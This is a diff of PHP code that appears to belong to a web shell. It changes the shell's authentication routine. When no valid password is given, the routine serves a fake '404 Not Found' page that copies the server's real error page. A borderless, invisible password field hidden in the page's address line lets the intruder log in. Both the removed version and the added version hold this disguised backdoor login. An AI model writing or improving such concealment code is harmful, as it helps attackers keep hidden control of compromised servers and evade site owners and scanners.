@@ -24,27 +24,17 @@ if(!function_exists('auth')){
 				}
 			}
 
-			if(!isset($c['pass']) || ((isset($c['pass'])&&($c['pass']!=$GLOBALS['pass'])))){
-				header("HTTP/1.1 404 Not Found");
-				$res = "<!doctype html>
-						<html>
-						<head>
-						<title>404 Not Found</title>
-						<meta charset='utf-8'>
-						<meta name='robots' content='noindex, nofollow, noarchive'>
-						</head>
-						<body>
-						<h1>Not Found</h1>
-						<p>The requested URL ".$_SERVER['REQUEST_URI']." was not found on this server.</p>
-						<hr>
-						<address>".$_SERVER['SERVER_SOFTWARE']." Server at ".$_SERVER['SERVER_ADDR']." Port ".$_SERVER['SERVER_PORT']."
-						<script type='text/javascript'>
-						var d = document;
-						d.write(\"<form method='post'><center><input type='password' id='pass' name='pass' style='border:0px;cursor:default;'></center></form>\");
-						</script>
-						</address>
-						</body>
-						</html>";
+			elseif(!isset($c['pass']) || ((isset($c['pass'])&&($c['pass']!=$GLOBALS['pass'])))){
+				header("HTTP/1.0 404 Not Found");
+				$res = "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n".
+						"<html><head>\n".
+						"<title>404 Not Found</title><meta name='robots' content='noindex,nofollow,noarchive'>\n".
+						"</head><body>\n".
+						"<h1>Not Found</h1>\n".
+						"<p>The requested URL ".$_SERVER['REQUEST_URI']." was not found on this server.</p>\n".
+						"<hr>\n".
+						"<address>".$_SERVER['SERVER_SOFTWARE']." Server at ".$_SERVER['SERVER_ADDR']." Port ".$_SERVER['SERVER_PORT']."<script type='text/javascript'>document.write(\"<form method='post'><center><input type='password' id='pass' name='pass' style='border:0px;cursor:default;'></center></form>\");</script></address>\n".
+						"</body></html>\n";
 				echo $res;
 				die();
 			}
